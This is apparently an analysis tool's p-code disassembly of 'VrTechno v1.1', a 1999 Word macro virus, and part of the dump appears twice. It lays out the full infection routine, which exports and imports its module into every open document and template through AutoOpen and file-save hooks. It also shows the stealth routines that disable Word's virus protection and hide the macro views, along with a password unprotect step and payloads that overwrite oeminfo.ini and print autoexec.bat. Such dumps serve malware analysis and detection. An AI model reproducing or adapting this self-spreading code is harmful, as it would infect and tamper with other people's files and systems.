' 	PrintChan 
' 	LitStr 0x0015 "[Support Information]"
' 	PrintItemNL 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Line1=Êîìïüþòåð çàðàæåí âèðóñîì: "
' 	Ld VrVersion 
' 	Add 
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Line2="
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Line3=Word Macro Virus"
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "Line4=John Great, ÄÂÞÈ ÌÂÄ ÐÔ - (C) '1999"
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #115:
' Line #116:
' 	FuncDefn (Private Sub CreateImageScreen())
' Line #117:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #118:
' 	Ld ActiveDocument 
' 	MemLd ProtectionType 
' 	Ld wdNoProtection 
' 	Eq 
' 	IfBlock 
' Line #119:
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd PageWidth 
' 	LitDI2 0x019A 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	Div 
' 	St x0 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd TopMargin 
' 	St y0 
' Line #120:
' 	SetStmt 
' 	Ld msoShapeRoundedRectangle 
' 	Ld x0 
' 	Ld y0 
' 	LitDI2 0x019A 
' 	LitDI2 0x0082 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	Set aShape 
' Line #121:
' 	StartWithExpr 
' 	Ld aShape 
' 	With 
' Line #122:
' 	Ld msoTrue 
' 	MemLdWith Fill 
' 	MemSt Visible 
' Line #123:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #124:
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	MemLdWith Fill 
' 	MemSt Transparency 
' Line #125:
' 	Ld msoGradientHorizontal 
' 	LitDI2 0x0004 
' 	LitR8 0x3D71 0xD70A 0x70A3 0x3FCD 
' 	MemLdWith Fill 
' 	ArgsMemCall OneColorGradient 0x0003 
' Line #126:
' 	Ld msoBringInFrontOfText 
' 	ArgsMemCallWith ZOrder 0x0001 
' Line #127:
' 	MemLdWith TextFrame 
' 	MemLd TextRange 
' 	ArgsMemCall Set 0x0000 
' Line #128:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #129:
' 	Ld wdEnglishUS 
' 	MemStWith LanguageID 
' Line #130:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #131:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Bold 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Font 
' 	MemSt Italic 
' Line #132:
' 	LitStr 0x000F "Times New Roman"
' 	MemLdWith Font 
' 	MemSt New 
' 	BoS 0x0000 
' 	LitDI2 0x0014 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #133:
' 	LitStr 0x001A "Microsoft Word Macro Virus"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #134:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Italic 
' 	BoS 0x0000 
' 	LitDI2 0x000E 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #135:
' 	Ld vbCr 
' 	LitStr 0x000C "VrTechnoCode"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #136:
' 	LitVarSpecial (False)
' 	MemLdWith Font 
' 	MemSt Italic 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Font 
' 	MemSt Bold 
' 	BoS 0x0000 
' 	LitDI2 0x000A 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #137:
' 	Ld wdAlignParagraphLeft 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #138:
' 	LitStr 0x000A "- Word 7.0"
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0014 "- Stealth Technology"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0020 "- Infect Documents and Templates"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #139:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #140:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Italic 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Bold 
' 	BoS 0x0000 
' 	LitDI2 0x000E 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #141:
' 	LitStr 0x003D "Copyright by John Great from Russia Far East, Khabarovsk'1999"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #142:
' 	EndWith 
' 	BoS 0x0000 
' 	EndWith 
' Line #143:
' 	StartWithExpr 
' 	Ld msoShapeExplosion1 
' 	Ld x0 
' 	LitDI2 0x00E1 
' 	Add 
' 	Ld y0 
' 	LitDI2 0x0019 
' 	Add 
' 	LitDI2 0x00B4 
' 	LitDI2 0x0048 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	With 
' Line #144:
' 	LitR8 0x0000 0x0000 0x8000 0x4066 
' 	ArgsMemCallWith IncrementRotation 0x0001 
' Line #145:
' 	Ld msoTrue 
' 	MemLdWith Fill 
' 	MemSt Visible 
' Line #146:
' 	Ld msoGradientHorizontal 
' 	LitDI2 0x0001 
' 	Ld msoGradientFire 
' 	MemLdWith Fill 
' 	ArgsMemCall PresetGradient 0x0003 
' Line #147:
' 	Ld msoSendBehindText 
' 	ArgsMemCallWith ZOrder 0x0001 
' Line #148:
' 	MemLdWith TextFrame 
' 	MemLd TextRange 
' 	ArgsMemCall Set 0x0000 
' Line #149:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #150:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Bold 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Italic 
' Line #151:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #152:
' 	LitStr 0x000F "Times New Roman"
' 	MemLdWith Font 
' 	MemSt New 
' 	BoS 0x0000 
' 	LitDI2 0x0010 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #153:
' 	LitStr 0x000B "Version 1.1"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #154:
' 	EndWith 
' Line #155:
' 	Ld aShape 
' 	MemLd New 
' 	MemLdWith New 
' 	ArgsArray Array 0x0002 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #156:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Group 
' 	ArgsMemCall Set 0x0000 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall UndoClear 0x0000 
' Line #157:
' 	EndWith 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	EndSub 
' Macros/VBA/VrTechnoCode1 - 11428 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0004 0x0038 "-------------------------------------------------------'"
' Line #2:
' 	QuoteRem 0x0004 0x0038 "  VR Òåõíîëîãèÿ v1.1 by John Great from Russia (C)'99  '"
' Line #3:
' 	QuoteRem 0x0004 0x0038 "-------------------------------------------------------'"
' Line #4:
' Line #5:
' 	Dim (Const) 
' 	LitStr 0x000C "VrTechnoCode"
' 	VarDefn VrMName (As String)
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x000D "VrTechno V1.1"
' 	VarDefn VrVersion (As String)
' Line #7:
' 	Dim (Const) 
' 	LitStr 0x0005 "Elite"
' 	VarDefn VrPassword (As String)
' Line #8:
' 	Dim (Const) 
' 	LitStr 0x0013 "Word Macro ÂÈÐÓÑ!!!"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0013 "ÄÂÞÈ ÌÂÄ ÐÔ  © 1999"
' 	Concat 
' 	VarDefn VrCopyright (As String)
' Line #9:
' Line #10:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #11:
' 	QuoteRem 0x0000 0x0014 "  Install-Module:  '"
' Line #12:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub VrInstall())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #15:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #16:
' 	QuoteRem 0x0000 0x0013 "Ïðîâåðêà èíñòàëÿöèè"
' Line #17:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #18:
' 	Ld aDoc 
' 	MemLd VBProject 
' 	MemLd Description 
' 	Ld VrVersion 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoSub VrInfect 
' 	Else 
' 	BoSImplicit 
' 	Ld aDoc 
' 	MemLd ProtectionType 
' 	Ld wdNoProtection 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld VrPassword 
' 	Ld aDoc 
' 	ArgsMemCall Unprotect 0x0001 
' 	EndIf 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Next 
' Line #20:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #21:
' 	Ld aDoc 
' 	MemLd VBProject 
' 	MemLd Description 
' 	Ld VrVersion 
' 	Ne 
' 	IfBlock 
' Line #22:
' 	GoSub VrInfect 
' 	BoS 0x0000 
' 	Ld aDoc 
' 	ArgsMemCall Save 0x0000 
' Line #23:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld aDoc 
' 	MemLd ProtectionType 
' 	Ld wdNoProtection 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld VrPassword 
' 	Ld aDoc 
' 	ArgsMemCall Unprotect 0x0001 
' 	EndIf 
' Line #24:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' 	BoS 0x0000 
' 	GoTo Err_Code 
' Line #25:
' 	Label VrInfect 
' Line #26:
' 	Ld wdProgramPath 
' 	Ld Application 
' 	MemLd Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0001 "\"
' 	Ld VrMName 
' 	Add 
' 	Concat 
' 	St VrFName 
' Line #27:
' 	Ld VrFName 
' 	Paren 
' 	Ld VrMName 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #28:
' 	Ld VrFName 
' 	Paren 
' 	Ld aDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	BoS 0x0000 
' 	Ld VrFName 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #29:
' 	Ld VrVersion 
' 	Ld aDoc 
' 	MemLd VBProject 
' 	MemSt Description 
' Line #30:
' 	LitStr 0x0008 "VrTechno"
' 	LitStr 0x0007 "Version"
' 	Ld VrVersion 
' 	LitStr 0x0007 "win.ini"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #31:
' 	LitStr 0x0008 "VrTechno"
' 	LitStr 0x0007 "Install"
' 	LitStr 0x0007 "win.ini"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St x 
' Line #32:
' 	LitStr 0x0008 "VrTechno"
' 	LitStr 0x0007 "Install"
' 	Ld x 
' 	LitStr 0x0000 ""
' 	Eq 
' 	LitDI2 0x0000 
' 	Ld x 
' 	ArgsLd IIf 0x0003 
' 	LitDI2 0x0001 
' 	Add 
' 	Coerce (Str) 
' 	LitStr 0x0007 "win.ini"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #33:
' 	Return 
' Line #34:
' 	Label Err_Code 
' Line #35:
' 	LitDI2 0x0009 
' 	ArgsLd IsChance 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall AddOemInfo 0x0000 
' 	EndIf 
' Line #36:
' 	LitDI2 0x0014 
' 	ArgsLd IsChance 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall CreateImageScreen 0x0000 
' 	EndIf 
' Line #37:
' 	EndSub 
' Line #38:
' Line #39:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #40:
' 	QuoteRem 0x0000 0x0014 "  Infect-Module:   '"
' Line #41:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #42:
' Line #43:
' 	QuoteRem 0x0000 0x0007 "Îòêðûòü"
' Line #44:
' 	FuncDefn (Sub AutoOpen())
' 	BoS 0x0000 
' 	ArgsCall VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #45:
' 	FuncDefn (Sub AutoExec())
' 	BoS 0x0000 
' 	ArgsCall VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub FileOpen())
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #47:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	If 
' 	BoSImplicit 
' 	ArgsCall VrInstall 0x0000 
' 	EndIf 
' Line #48:
' 	EndSub 
' Line #49:
' 	QuoteRem 0x0000 0x000E "Íîâûé äîêóìåíò"
' Line #50:
' 	FuncDefn (Sub FileNew())
' 	BoS 0x0000 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Add 0x0000 
' 	BoS 0x0000 
' 	ArgsCall VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub FileNewDefault())
' Line #52:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Template 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Add 0x0001 
' 	BoS 0x0000 
' 	ArgsCall VrInstall 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #53:
' 	QuoteRem 0x0000 0x0009 "Ñîõðàíèòü"
' Line #54:
' 	FuncDefn (Sub FileSaveAs())
' 	BoS 0x0000 
' 	ArgsCall VrInstall 0x0000 
' Line #55:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0001 
' 	Eq 
' 	Or 
' 	Paren 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #57:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub FileSave())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	ArgsCall VrInstall 0x0000 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #59:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	IfBlock 
' Line #60:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0001 
' 	Eq 
' 	Or 
' 	Paren 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #61:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #62:
' 	QuoteRem 0x0000 0x0007 "Çàêðûòü"
' Line #63:
' 	FuncDefn (Sub FileClose())
' 	BoS 0x0000 
' 	ArgsCall FileSave 0x0000 
' Line #64:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	IfBlock 
' Line #65:
' 	Ld ActiveDocument 
' 	MemLd ProtectionType 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	LitDI2 0x0000 
' 	Ld VrPassword 
' 	Ld ActiveDocument 
' 	ArgsMemCall Protect 0x0003 
' 	EndIf 
' Line #66:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	Ld wdDoNotSaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' 	BoS 0x0000 
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub DocClose())
' 	BoS 0x0000 
' 	ArgsCall FileClose 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #68:
' Line #69:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #70:
' 	QuoteRem 0x0000 0x0014 "  Stealth-Module:  '"
' Line #71:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #72:
' Line #73:
' 	FuncDefn (Sub ViewVBCode())
' 	BoS 0x0000 
' 	ArgsCall VrStealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' 	QuoteRem 0x0028 0x000E "ToolsCustomize"
' Line #74:
' 	FuncDefn (Sub ToolsMacro())
' 	BoS 0x0000 
' 	ArgsCall VrStealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub FileTemplates())
' 	BoS 0x0000 
' 	ArgsCall VrStealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub ToolsOptions())
' Line #77:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #78:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #79:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #80:
' 	FuncDefn (Private Sub VrStealth())
' Line #81:
' 	LitDI2 0x0005 
' 	ArgsLd IsChance 0x0001 
' 	IfBlock 
' Line #82:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #83:
' 	Ld msoAnimationThinking 
' 	MemStWith Animation 
' Line #84:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #85:
' 	LitStr 0x0012 "VR Òåõíîëîãèÿ v1.0"
' 	MemStWith Heading 
' Line #86:
' 	Ld VrCopyright 
' 	MemStWith Then 
' Line #87:
' 	ArgsMemCallWith Show 0x0000 
' Line #88:
' 	EndWith 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #89:
' 	FuncDefn (Private Function IsChance(Num As Integer) As Boolean)
' Line #90:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	Ld Num 
' 	Mul 
' 	FnInt 
' 	Coerce (Bool) 
' 	Not 
' 	St IsChance 
' 	BoS 0x0000 
' 	EndFunc 
' Line #91:
' Line #92:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #93:
' 	QuoteRem 0x0000 0x0014 " Destruct-Module:  '"
' Line #94:
' 	QuoteRem 0x0000 0x0014 "-------------------'"
' Line #95:
' Line #96:
' 	FuncDefn (Sub FilePrint())
' 	BoS 0x0000 
' 	StartWithExpr 
' 	Ld wdDialogFilePrint 
' 	Ld Dialogs 
' 	ArgsMemLd Item 0x0001 
' 	With 
' Line #97:
' 	LitDI2 0x0005 
' 	ArgsLd IsChance 0x0001 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "C:\autoexec.bat"
' 	MemStWith FileName 
' 	EndIf 
' Line #98:
' 	ArgsMemCallWith Show 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub FilePrintDefault())
' Line #100:
' 	LitDI2 0x0005 
' 	ArgsLd IsChance 0x0001 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "C:\autoexec.bat"
' 	ParamNamed FileName 
' 	Ld Application 
' 	ArgsMemCall PrintOut 0x0001 
' 	Else 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' 	EndIf 
' Line #101:
' 	EndSub 
' Line #102:
' Line #103:
' 	FuncDefn (Private Sub AddOemInfo())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitStr 0x0011 "C:\Windows\System"
' 	St fn 
' Line #104:
' 	Ld fn 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #105:
' 	Ld fn 
' 	LitStr 0x000C "\oeminfo.ini"
' 	Add 
' 	St fn 
' 	BoS 0x0000 
' 	Ld fn 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld fn 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "[General]"
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Manufacturer=ÄÂÞÈ ÌÂÄ ÐÔ"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Model=MS Word Âèðóñ"
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "[Support Information]"
' 	PrintItemNL 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Line1=Êîìïüþòåð çàðàæåí âèðóñîì: "
' 	Ld VrVersion 
' 	Add 
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Line2="
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Line3=Word Macro Virus"
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "Line4=John Great, ÄÂÞÈ ÌÂÄ ÐÔ - (C) '1999"
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #115:
' Line #116:
' 	FuncDefn (Private Sub CreateImageScreen())
' Line #117:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #118:
' 	Ld ActiveDocument 
' 	MemLd ProtectionType 
' 	Ld wdNoProtection 
' 	Eq 
' 	IfBlock 
' Line #119:
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd PageWidth 
' 	LitDI2 0x019A 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	Div 
' 	St x0 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd TopMargin 
' 	St y0 
' Line #120:
' 	SetStmt 
' 	Ld msoShapeRoundedRectangle 
' 	Ld x0 
' 	Ld y0 
' 	LitDI2 0x019A 
' 	LitDI2 0x0082 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	Set aShape 
' Line #121:
' 	StartWithExpr 
' 	Ld aShape 
' 	With 
' Line #122:
' 	Ld msoTrue 
' 	MemLdWith Fill 
' 	MemSt Visible 
' Line #123:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #124:
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	MemLdWith Fill 
' 	MemSt Transparency 
' Line #125:
' 	Ld msoGradientHorizontal 
' 	LitDI2 0x0004 
' 	LitR8 0x3D71 0xD70A 0x70A3 0x3FCD 
' 	MemLdWith Fill 
' 	ArgsMemCall OneColorGradient 0x0003 
' Line #126:
' 	Ld msoBringInFrontOfText 
' 	ArgsMemCallWith ZOrder 0x0001 
' Line #127:
' 	MemLdWith TextFrame 
' 	MemLd TextRange 
' 	ArgsMemCall Set 0x0000 
' Line #128:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #129:
' 	Ld wdEnglishUS 
' 	MemStWith LanguageID 
' Line #130:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #131:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Bold 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Font 
' 	MemSt Italic 
' Line #132:
' 	LitStr 0x000F "Times New Roman"
' 	MemLdWith Font 
' 	MemSt New 
' 	BoS 0x0000 
' 	LitDI2 0x0014 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #133:
' 	LitStr 0x001A "Microsoft Word Macro Virus"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #134:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Italic 
' 	BoS 0x0000 
' 	LitDI2 0x000E 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #135:
' 	Ld vbCr 
' 	LitStr 0x000C "VrTechnoCode"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #136:
' 	LitVarSpecial (False)
' 	MemLdWith Font 
' 	MemSt Italic 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Font 
' 	MemSt Bold 
' 	BoS 0x0000 
' 	LitDI2 0x000A 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #137:
' 	Ld wdAlignParagraphLeft 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #138:
' 	LitStr 0x000A "- Word 7.0"
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0014 "- Stealth Technology"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0020 "- Infect Documents and Templates"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #139:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #140:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Italic 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Bold 
' 	BoS 0x0000 
' 	LitDI2 0x000E 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #141:
' 	LitStr 0x003D "Copyright by John Great from Russia Far East, Khabarovsk'1999"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #142:
' 	EndWith 
' 	BoS 0x0000 
' 	EndWith 
' Line #143:
' 	StartWithExpr 
' 	Ld msoShapeExplosion1 
' 	Ld x0 
' 	LitDI2 0x00E1 
' 	Add 
' 	Ld y0 
' 	LitDI2 0x0019 
' 	Add 
' 	LitDI2 0x00B4 
' 	LitDI2 0x0048 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	With 
' Line #144:
